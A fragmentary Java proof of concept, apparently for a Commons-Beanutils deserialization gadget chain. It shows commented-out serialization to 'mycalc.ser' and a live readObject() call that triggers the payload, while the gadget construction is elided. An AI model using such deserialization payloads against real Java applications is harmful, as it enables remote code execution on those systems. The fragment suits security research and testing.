...
/**
 * @author ga0weI
 * @deprecated  cb pro payload  without Commons-Collections lib
 */
...
//            payload.makeNestedClass("transform",false);
        ...
        // 反序列化
//            ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream("mycalc.ser"));
//            out.writeObject(queue);
        ObjectInputStream in = new ObjectInputStream(new FileInputStream("mycalc.ser"));
        in.readObject();
    }
}
